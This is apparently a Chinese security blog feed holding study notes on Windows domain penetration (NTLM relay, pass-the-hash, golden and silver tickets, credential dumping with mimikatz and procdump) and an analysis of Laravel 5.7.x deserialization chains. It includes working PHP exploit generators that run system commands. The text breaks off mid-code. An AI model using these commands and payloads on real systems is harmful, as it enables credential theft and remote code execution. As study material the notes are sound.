<h2 id="分类梳理">分类梳理</h2>
<blockquote>
<p>对于已经了解过的就不重复梳理</p>
</blockquote>
<h3 id="ntlm系列">NTLM系列</h3>
<h4 id="中间人">中间人</h4>
<blockquote>
<p>Net-NTLM可通过中间人+hashcat破解</p>
</blockquote>
<h5 id="前置知识">前置知识</h5>
<h6 id="中间人相关">中间人相关</h6>
<p>LLMNR（Link-Local Multicast Name Resolution）：</p>
<ul>
<li>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到名称，那么主机就会向自己配置的主DNS服务器发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR</li>
<li>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内</li>
<li>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机</li>
</ul>
<p><strong>简单来说，DNS名称服务器请求失败时，就会通过链路本地多播名称解析（LLMNR）以及Net-BIOS名称服务，试图在本地进行名称解析</strong></p>
<p>NBT-NS（Netbios Name Service）：</p>
<ul>
<li>与上述基本相同</li>
</ul>
<p><strong>二者区别</strong>：</p>
<ul>
<li>NetBIOS基于广播，而LLMNR基于多播</li>
<li>NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有WindowsVista和更高版本才支持LLMNR</li>
<li>LLMNR还支持IPv6，而NetBIOS不支持，因此，在启用了IPv6，但对IPv6管理不如IPv4那样细致的复杂网络中，就可能发生更广泛的攻击</li>
</ul>
<h6 id="挑战认证相关">挑战认证相关</h6>
<p>SSPI（Security Service Provider Interface）：</p>
<p>​	这是Windows定义的一套接口，定义了安全有关的函数功能，包括但是不限于</p>
<ul>
<li>身份认证机制</li>
<li>为其他协议提供的Session security机制</li>
<li>...</li>
</ul>
<p>SSP（Security Service Provider）：</p>
<p>​	SSPI的实现者，微软实现了以下的SSP</p>
<ul>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>...</li>
</ul>
<h5 id="从理论上理解">从理论上理解</h5>
<p>使用工具 <code>Responder</code>，在内网环境下，假设用户访问一个不存在的UNC路径，则最后会在局域网内发送LLMNR（或者NBNS？）请求，<code>Responder</code> 的作用就是回复这些请求，那么用户和攻击机（即<code>Responder</code>所在机器）发起质询和响应，可以截获到NLTMv2 SSP。</p>
<p>在本机测试后，即使弹出了登录框，输入密码后还是NTLMv2 SSP，因为是NTLM认证呀...可能和设置有关吧（其他文章里直接获取了明文密码），埋一个坑，后续再看。</p>
<h6 id="缺点">缺点</h6>
<ol>
<li>感觉触发的概率不是很大</li>
<li>跑的不是NTLM Hash，是NTLM-v1/v2 Hash，只能通过本地用Hashcat跑，比硬件</li>
</ol>
<h5 id="参考文章">参考文章</h5>
<p><a href="https://blog.csdn.net/wxh0000mm/article/details/105997105">发起NTLM</a></p>
<ul>
<li>Outlook ：<code>&lt;img src=&quot;\\172.16.100.1\outlook&quot;&gt;</code></li>
<li>OFFICE ：钓鱼可用</li>
<li>Mysql：load_file同样支持unc</li>
</ul>
<h3 id="kerberos系列">Kerberos系列</h3>
<h4 id="ms14-068">MS14-068</h4>
<p>首先补丁为<code>kb3011780</code><br>
原理：用户在向KDC申请TGT的时候，申明自己有域管理员权限，而KDC没有校验该票据的签名，导致权限提升。-&gt;从&lt;&lt;内网安全攻防&gt;&gt;摘录<br>
但是思考了以下觉得不对啊，看Kerberos认证里，第一步的时候如果申请了，AS会校验用户hash。查阅其他人的文章，找到如下：<br>
Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>
那么发现了，其实申请TGT是第二部，书里也写了，只是我没看到...</p>
<h3 id="token系列">Token系列</h3>
<p>分类：</p>
<ul>
<li>Delegation Tokens授权令牌</li>
<li>Impersonation Tokens模拟令牌</li>
</ul>
<p><code>注：用户注销后会切换至模拟令牌，不会注销</code></p>
<p>我认为这个是本地登录过administrator的情况才有？</p>
<p>常见的<code>msf</code>操作：</p>
<ul>
<li><code>load incognito</code></li>
<li><code>list_tokens -u</code></li>
<li><code>impoersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>（这里为上述列举出的token，如果存在就直接提权成功）</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(二)-PTH&PTT]]></title>
        <id>https://chriskalix.github.io/post/hPs3dwq1p/</id>
        <link href="https://chriskalix.github.io/post/hPs3dwq1p/">
        </link>
        <updated>2020-06-26T08:16:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="pth">PTH</h2>
<blockquote>
<p>内网中，经常需要抓取管理员密码(NTLM Hash)。PTH是一种不需要账户明文密码就能完成认证的一个技术。尤其是在域环境下，能帮助我们扩大战果</p>
</blockquote>
<h3 id="必须条件">必须条件</h3>
<ol>
<li>网络互达(这个有点多余，不互达怎么做)</li>
<li>需要用户名</li>
<li>需要NTLM Hash</li>
</ol>
<p>问题1：为什么需要用户名？<br>
答案：看一下NTLM协议，第一步就是传输用户名</p>
<p>问题2：如何使用NTLMv1/NTLMv2或者net NTLM进行HASH传递攻击？<br>
答案：这些都不行，只有NTLM Hash</p>
<h3 id="通常pth的渗透方式">通常PTH的渗透方式</h3>
<ul>
<li>获取一台域内主机的权限</li>
<li>Dump内存获取用户HASH</li>
<li>通过PTH尝试登录其他主机</li>
<li>继续收集HASH并尝试远程登录</li>
<li>直到获取域管理员HASH，最终成果控制整个域</li>
</ul>
<h3 id="现实情况">现实情况</h3>
<blockquote>
<p>会有补丁，策略等等，以下列出两种</p>
</blockquote>
<h4 id="对抗补丁">对抗补丁</h4>
<p>KB2871997（被称为PTH杀手），是微软在2014年5月13号推出的补丁，当时的标题为&quot;Update to fix the Pass-The-Hash Vulnerability&quot;，一周后改为&quot;Update to improve credentials protection and management&quot;<br>
使得本地账号不能再用于远程接入系统，这样就无法以本地管理员用户执行wmi、PSEXEC、schtasks、at和文件访问。然而，administrator用户仍能够PTH，这里是SID为500的用户，默认名为administrator，即使改名了，SID还是不会改变<br>
所以从防御视角来说，即使打了补丁，还要禁用SID=500的管理员用户</p>
<h4 id="laps">LAPS</h4>
<p>LAPS即Local Administrator Password Solution，是微软推出的本地密码管理方案。解决了域内主机本地管理员密码相同的问题。</p>
<h3 id="操作命令">操作命令</h3>
<blockquote>
<p>这里其实本地搭建一个域环境会理解的比较深刻，我之前搭建了，系统重装后忘记保存，暂时没有</p>
</blockquote>
<h4 id="使用ntlm-hash进行pth攻击">使用NTLM Hash进行PTH攻击</h4>
<blockquote>
<p>此方法在KB2871997后收到限制，只能用SID=500的账户进行PTH操作</p>
</blockquote>
<p><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /ntlm:xxxxx</code></p>
<h4 id="aes-256进行pth攻击ptk">AES-256进行PTH攻击(PTK)</h4>
<blockquote>
<p>此方法针对的是打上了KB2871997的机器（猜测就是为啥微软一周后就改名了），又叫<code>Pass The Key</code></p>
</blockquote>
<ol>
<li>mimikatz抓取AES-256密钥<br>
<code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></li>
<li><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /aes256:xxxxx</code></li>
</ol>
<h3 id="pth的其他场景">PTH的其他场景</h3>
<p>在<a href="https://www.secpulse.com/archives/105503.html">这篇文章</a>中我看到了其他场景。Restricted Admin Mode，开启这个模式后，默认可以用凭证登录</p>
<p><code>privilege::debug sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</code></p>
<h2 id="ptt">PTT</h2>
<blockquote>
<p>PTT，Pass The Ticket即票据传递攻击。<br>
cs中<br>
<code>kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话</code></p>
</blockquote>
<h3 id="golden-ticket黄金票据">Golden Ticket黄金票据</h3>
<blockquote>
<p>该票据的利用条件是原先已成功取得域用户(krbtgt)的HASH这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
</blockquote>
<p>相当于可以自己造TGT</p>
<h4 id="前提条件">前提条件</h4>
<ul>
<li>域名称</li>
<li>域SID</li>
<li>域krbtgt的hash（意味着你已经有域控权限）</li>
<li>伪造的用户名（任意用户或者不存在的用户）</li>
</ul>
<h4 id="具体操作">具体操作</h4>
<ol>
<li>
<p>提取域用户kgbtgt的NTLM Hash<br>
<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code>或者上个文章提到的方法</p>
</li>
<li>
<p>查看域内所有用户的hash<br>
<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></p>
</li>
<li>
<p>获取域SID<br>
<code>whoami /all</code></p>
</li>
<li>
<p>生成票据<br>
方法1： AES256</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p>方法2：NTLM Hash</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></p>
</li>
</ol>
<h4 id="防御">防御</h4>
<ol>
<li>经常更换KRBTGT密码</li>
<li>不允许域管账户登录其他服务器</li>
</ol>
<h3 id="silver-ticket白银票据">Silver Ticket白银票据</h3>
<blockquote>
<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信</p>
</blockquote>
<h4 id="前提条件-2">前提条件</h4>
<ul>
<li>域名称</li>
<li>域的SID</li>
<li>域中Server服务器账户的NTLM-Hash</li>
<li>伪造任意的用户名</li>
</ul>
<h4 id="具体操作-2">具体操作</h4>
<ol>
<li>导出hash<br>
<code>mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
<li>生成ticket<br>
<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型} /rc4:{NTLM Hash} /user:{用户名} /ptt&quot; exit Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大</code></li>
</ol>
<h4 id="防御-2">防御</h4>
<p>PAC</p>
<h2 id="参考文章">参考文章</h2>
<p><a href="http://www.vuln.cn/6813">乌云文章</a><br>
<a href="https://xz.aliyun.com/t/7051">先知文章</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(一)-Windows认证]]></title>
        <id>https://chriskalix.github.io/post/e3nr4E66U/</id>
        <link href="https://chriskalix.github.io/post/e3nr4E66U/">
        </link>
        <updated>2020-06-26T08:14:38.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>主要包含本地认证，网络认证，域认证</p>
</blockquote>
<h2 id="windows本地认证">Windows本地认证</h2>
<p>简述流程：当登录系统时候，用户的密码会被加密成NTLM Hash，再通过与SAM数据库中用户的哈希（<code>%SystemRoot%\system32\config\sam</code>）进行匹配从而完成校验。</p>
<h3 id="认证流程">认证流程</h3>
<p>简易图：<br>
<img src="https://chriskalix.github.io/post-images/1593159324969.png" alt="" loading="lazy"></p>
<p>提到的<strong>NTLM Hash</strong>，是一种单向哈希算法。顺便记一下，Windows中不以明文形式进行传输和存储。算法的流程如下：</p>
<p><code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
<p>简单地用py做个HASH：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593159333529.png" alt="" loading="lazy"></figure>
<blockquote>
<p><code>NTLM Hash</code>的前身为<code>LM Hash</code>，存在于<code>Windows Server 2008</code>之前版本，由于安全性被淘汰</p>
</blockquote>
<p>经常我们听到用mimikatz抓密码这个操作，其实就是从<code>lsass.exe</code>这个进程中读取到的</p>
<h3 id="抓取密码">抓取密码</h3>
<blockquote>
<p>这一过程需要system，毕竟访问的是<code>lsass.exe</code></p>
</blockquote>
<h4 id="用procdump-mimikatz">用Procdump + Mimikatz</h4>
<p>mimikatz都听过，但是不做免杀就是冲锋兵，没落地就被吃了。那怎么办，可以用微软自带的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>，命令如下：<br>
<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code><br>
然后再脱到本地，用<code>mimikatz</code>跑一下<br>
<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
<h4 id="无工具直接抓取">无工具直接抓取</h4>
<p>直接通过reg的save选项保存<br>
<code>reg save hklm\sam sam.hive</code><br>
<code>reg save hklm\system system.hive</code></p>
<p>然后拖到本地，mimikatz跑<br>
<code>lsadump::sam /sam:sam.hive /system:system.hive</code></p>
<p>问题：为什么有时候看到能抓明文，有时候又是抓NTLM Hash？</p>
<p>答案：默认Win10或者win server 2012r2以上的，禁止在内存中保存明文密码(WDigest策略)，所以有时候需要明文密码的时候，就需要Hook winlogon程序，然后开启WDigest等待对方登录。</p>
<h2 id="windows网络认证">Windows网络认证</h2>
<p>工作组环境下远程登录另外一台设备所采用的认证机制。常见的如SMB</p>
<h3 id="ntlm协议">NTLM协议</h3>
<p>分为三步骤</p>
<ol>
<li>协商</li>
<li>质询</li>
<li>验证</li>
</ol>
<h4 id="1-协商">1. 协商</h4>
<p>协商认证版本（NTLM v1/NTLM v2）</p>
<h4 id="2-质询">2. <strong>质询</strong></h4>
<p>**挑战（Chalenge）/响应（Response）**认证机制。步骤如下：</p>
<ol>
<li>客户端向服务端发送用户信息（用户名）请求</li>
<li>服务端接受到请求，生成一个16位的随机数，成为&quot;Challenge&quot;，服务端查询用户名所对应的NTLM Hash，用该哈希加密&quot;Challeng&quot;，保存至内存中，称之为&quot;Challeng1&quot;，之后再将&quot;Challenge&quot;发送至客户端</li>
<li>客户端收到&quot;Chanlleng&quot;后，同样的使用自己的NTLM Hash，对&quot;Challenge&quot;进行加密比对，生成Response传递给客户端</li>
</ol>
<p>其中NTLM Hash加密Challenge的结果，在协议中称为Net NTLM Hash</p>
<h4 id="3-验证">3. 验证</h4>
<p>客户端收到上述的Response，与内存中的Chanllenge1进行比对，完成验证</p>
<h2 id="域认证kerberos">域认证（Kerberos）</h2>
<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
<p>域认证所包含的角色有：</p>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Centor) = DC</li>
</ul>
<h3 id="详细流程">详细流程</h3>
<p>流程图如下所示：<br>
<img src="https://chriskalix.github.io/post-images/1593159403049.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Laravel 5.7.x反序列化链分析]]></title>
        <id>https://chriskalix.github.io/post/xpSoAzZun/</id>
        <link href="https://chriskalix.github.io/post/xpSoAzZun/">
        </link>
        <updated>2020-06-26T08:02:56.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>前段时间电脑重装后忘记备份了，从环境开始</p>
</blockquote>
<h2 id="环境预备">环境预备</h2>
<h3 id="准备工具">准备工具</h3>
<ol>
<li>PHPStudy - PHP 7.1.9</li>
<li>composer</li>
<li>VSCODE(调试)</li>
</ol>
<h3 id="安装">安装</h3>
<ol>
<li>设置源 ：<code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></li>
<li>安装Laravel ：<code>composer create-project laravel/laravel Laravel --prefer-dist &quot;5.7.*&quot;</code></li>
</ol>
<h2 id="开始调试">开始调试</h2>
<blockquote>
<p>比赛前没有看过Laravel框架，比赛的时候很慌乱，到处找链，发现入口点都是一样的，但是被堵死了</p>
</blockquote>
<h3 id="laravel-57x反序列化链一">Laravel 5.7.x反序列化链(一)</h3>
<h4 id="设置反序列化入口点">设置反序列化入口点</h4>
<p>先往<code>app/Http/Controllers/</code>下添加<code>TaskController.php</code>文件，内容为</p>
<pre><code class="language-php">&lt;?php
namespace App\Http\Controllers;
class TaskController 
{ 
public function index(){
    if(isset($_GET['p'])){
        unserialize($_GET['p']);    
    } 
    return &quot;There is an param names p (get)&quot;; 
    } 
} 
?&gt;
</code></pre>
<p>在<code>routes/web.php</code>下添加路由</p>
<pre><code class="language-php">Route::get('/index', 'TaskController@index');
</code></pre>
<p>访问<code>localhost/Laravel/public/index</code>，返回<code>There is an param names p (get)</code>证明成功</p>
<h4 id="反序列化入口点">反序列化入口点</h4>
<p>网上能找到的，如<code>CVE-2019-9081</code>，大多反序列的入口点为<code>vendor/laravel/framework/src/illuminate/Foundation/Testing/PendingCommand.php</code>，中的<code>PendingCommand</code>类，提取出相关的函数点，如下：</p>
<pre><code class="language-php">class PendingCommand
{
	public $test;
	protected $app;
	protected $command;
	protected $parameters;
	protected $expectedExitCode;
	protected $hasExecuted = false;
	...
    public function run()
    {
    	...
    }
    ...
    public function __destruct()
    {
        if ($this-&gt;hasExecuted) {
            return;
        }

        $this-&gt;run();
    }
}
</code></pre>
<h4 id="继续跟进">继续跟进</h4>
<p>默认调用了<code>$this-&gt;run()</code>，继续跟进<code>run()</code>下的代码</p>
<pre><code class="language-php">    /**
     * Execute the command.
     *
     * @return int
    */
   public function run()
    {
        $this-&gt;hasExecuted = true;
        $this-&gt;mockConsoleOutput();
        try {
            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
        } catch (NoMatchingExpectationException $e) {
            if ($e-&gt;getMethodName() === 'askQuestion') {
                $this-&gt;test-&gt;fail('Unexpected question &quot;'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'&quot; was asked.');
            }
            throw $e;
        }
        if ($this-&gt;expectedExitCode !== null) {
            $this-&gt;test-&gt;assertEquals(
                $this-&gt;expectedExitCode, $exitCode,
                &quot;Expected status code {$this-&gt;expectedExitCode} but received {$exitCode}.&quot;
            );
        }
        return $exitCode;
    }
</code></pre>
<p>为什么看到<code>run</code>方法比较兴奋，因为上面注释写着<code>execute the command</code>，一看就是有执行的样子。但是先调用了该类的<code>mockConsoleOutput</code>方法，继续跟进查看，这边构造的时候注意<code>$app</code>的类问题，在该文件中有注释<code>* @param \Illuminate\Foundation\Application $app</code>。该类在文件<code>vendor/laravel/framework/src/illuminate/Foundation/Application.php</code>下</p>
<pre><code class="language-php">protected function mockConsoleOutput()
{
    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
        (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),
    ]);

    foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) {
        $mock-&gt;shouldReceive('askQuestion')
            -&gt;once()
            -&gt;ordered()
            -&gt;with(Mockery::on(function ($argument) use ($question) {
                return $argument-&gt;getQuestion() == $question[0];
            }))
            -&gt;andReturnUsing(function () use ($question, $i) {
                unset($this-&gt;test-&gt;expectedQuestions[$i]);

                return $question[1];
            });
    }

    $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {
        return $mock;
    });
}
</code></pre>
<p>看到<code>foreach</code>那行，因为<code>test</code>可控，所以该函数可以调用任意类下的<code>__get</code>。全局搜索，还是有挺多的，网上的文章不同的大部分在这里开支，有使用<code>Illuminate\Auth\GenericUser</code>类的，也有使用<code>Faker\DefaultGenerator</code>类的。这边挑取<code>Faker\DefaultGenerator</code>进行跟进分析</p>
<h4 id="链子1">链子1</h4>
<p>找到文件<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>，如下：</p>
<pre><code class="language-php">class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this-&gt;default = $default;
    }
    public function __get($attribute)
    {
        return $this-&gt;default;
    }
    public function __call($method, $attributes)
    {
        return $this-&gt;default;
    }
}

</code></pre>
<p>跟先知文章走，到这里先自己构造一遍</p>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation {
	class Application {
		public function __construct() {
		}
	}
}

namespace {
	$c = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$b = new Illuminate\Foundation\Application();
	$a = new Illuminate\Foundation\Testing\PendingCommand($c, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>给<code>PendingCommand</code>传的不是array，会报如下错误<br>
<img src="https://chriskalix.github.io/post-images/1593158937485.png" alt="" loading="lazy"></p>
<h4 id="关键函数">关键函数</h4>
<p>继续跟进到</p>
<pre><code class="language-php">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
</code></pre>
<p>这时候需要认真看，因为调到这里的时候报错了。首先先看一下app是什么，在代码里的注释有，如下：</p>
<pre><code class="language-php">/**
 * The application instance.
 *
 * @var \Illuminate\Foundation\Application
 */
protected $app;
</code></pre>
<p>其实就是<code>\Illuminate\Foundation\Application</code>下的类，<code>Kernel::class</code>其实就是字符串<code>Illuminate\Contracts\Console\Kernel</code>，这里讲起来比较绕，直接上图。</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593158913879.png" alt="" loading="lazy"></figure>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances = [];
        public function __construct($instances = [])
        {
            $this-&gt;instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
	$d = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$c = new Illuminate\Foundation\Application();
	$b = new Illuminate\Foundation\Application($c);
	$a = new Illuminate\Foundation\Testing\PendingCommand($d, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>最后POC如上，就是和先知那个文章一样了，照着跟的，不过这个CVE其实有版本限制</p>
<h3 id="laravel反序列化链二">Laravel反序列化链（二）</h3>
<blockquote>
<p>这个链子是群里奶权师傅的0day，链子十分神奇，属实太强了。不是我的不是我的不是我的，是奶权的，是奶权的，是奶权的。</p>
</blockquote>
<h4 id="反序列化入口点-2">反序列化入口点</h4>
<p>入口点文件在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteSteam/TemporaryFileByteStream.php</code>的<code>Swift_ByteStream_TemporaryFileByteStream</code>类</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1593158964510.png" alt="" loading="lazy"></figure>
<p>跟到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php</code>的<code>Swift_ByteStream_FileByteStream</code>下的<code>getpath()</code></p>
<pre><code class="language-php">public function getPath()
{
    return $this-&gt;path;
}
</code></pre>
<p>这里可控，且<code>file_exists</code>所以触发任意类的 <code>__toString()</code></p>
<h4 id="继续跟进-2">继续跟进</h4>
<p><code>vendor/laravel/framework/src/Illuminate/View/View.php</code> 下的<code>__toString()</code></p>
<pre><code class="language-php">public function __toString()
{
    return $this-&gt;render();
}
</code></pre>
<p>跟到<code>render</code>函数</p>
<pre><code class="language-php">public function render(callable $callback = null)
{
    try {
        $contents = $this-&gt;renderContents();

        $response = isset($callback) ? call_user_func($callback, $this, $contents) : null;

        // Once we have the contents of the view, we will flush the sections if we are
        // done rendering all views so that there is nothing left hanging over when
        // another view gets rendered in the future by the application developer.
        $this-&gt;factory-&gt;flushStateIfDoneRendering();

        return ! is_null($response) ? $response : $contents;
    } catch (Exception $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    } catch (Throwable $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    }
}
</code></pre>
<p>虽然<code>try</code>出现了<code>call_user_func</code>，但是<code>$callback</code>是空的，可以看到<code>$this-&gt;factory-&gt;flushStateIfDoneRendering();</code> 是可控的，可以触发任意类 <code>__call()</code>，作为跳板继续跟进。在<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>下</p>
<pre><code class="language-php">public function __call($method, $attributes)
{
    return $this-&gt;format($method, $attributes);
}
</code></pre>
<p>继续跟进</p>
<pre><code class="language-php">public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
}
</code></pre>
<p>这里只有<code>$formatter</code>是可控的，跟进<code>getFormatter</code>，得到如下</p>
<pre><code class="language-php">public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter));
}
</code></pre>
<p><code>getformatter</code>中的<code>return $this-&gt;formatters[$formatter]</code>，因为<code>$formatters</code>与<code>$formatter</code>均可控，所以这里调用任意类的任意方法，但是由于<code>format</code>方法中的<code>$arguements</code>为空，不能对函数进行传参</p>
<h4 id="执行点">执行点</h4>
<blockquote>
<p>这个地方我觉得是最神奇的，我看着poc写分析过程的时候到这有点卡住了。后来看了奶权师傅的分析文章才明白，这个地方确实很神奇</p>
</blockquote>
<p>可用函数点为<code>/vendor/fzaninotto/faker/src/Faker/VaildGenerator.php</code>下的<code>__call</code>函数中，如下：</p>
<pre><code class="language-php">public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}
</code></pre>
<p>首先<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</code>获取<code>$res</code>返回值，然后走到<code>while</code>里的<code>call_user_func</code>进行执行，do while会先进去，再到while分支的，继续寻找能控制返回值的（且不需要输入参数）的函数。</p>
<p>在<code>vendor/phpunit/php-token-stream/src/Token/Stream.php</code> 中找到</p>
<pre><code class="language-php">public function getFilename()
{
    return $this-&gt;filename;
}
</code></pre>
<p>那么到这里利用链就分析完毕，这里写上POC，POC也是看着奶权写的，都是奶哥的，我负责复现5555555</p>
<pre><code class="language-php">&lt;?php
namespace {
    class PHP_Token_Stream {
        protected $filename;
        public function __construct() {
            $this-&gt;filename = &quot;whoami&quot;;
        }
    }
}

namespace Faker {
    use PHP_Token_Stream;
    class ValidGenerator {
        protected $generator;
        protected $validator; // while (!call_user_func($this-&gt;validator, $res));
        protected $maxRetries; // if ($i &gt; $this-&gt;maxRetries)执行一次，所以设定为2就行
        public function __construct() {
            $this-&gt;generator = new PHP_Token_Stream;
            $this-&gt;validator = &quot;system&quot;;
            $this-&gt;maxRetries = 2;
        }
    }
    class Generator {
        protected $formatters = array();
        public function __construct() {
            $this-&gt;formatters['flushState'] = [new ValidGenerator, &quot;getFilename&quot;];
        }
    }
}

namespace Illuminate\View {
    use Faker\Generator;
    class View {
        protected $factory;
        public function __construct() {
            $this-&gt;factory = new Generator;
        }
    }
}

namespace {
    use Illuminate\View\View;
    class Swift_ByteStream_FileByteStream {
        private $path;
        public function __construct() {
            $this-&gt;path = new View;
        }
    }

    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    }

    $a = new Swift_ByteStream_TemporaryFileByteStream;
    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream));
}
</code></pre>
<h4 id="反序列化链三">反序列化链（三）</h4>
<p>这里就不继续分析了，换了一个入口点进入<code>run()</code>，比赛的时候没注意哈哈哈，老老实实地复现跟踪</p>
<pre><code class="language-php">&lt;?php
//gadgets.php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;


        public function __construct($command, $parameters,$class,$app)
{
            $this-&gt;command = $command;
            $this-&gt;parameters = $parameters;
            $this-&gt;test=$class;
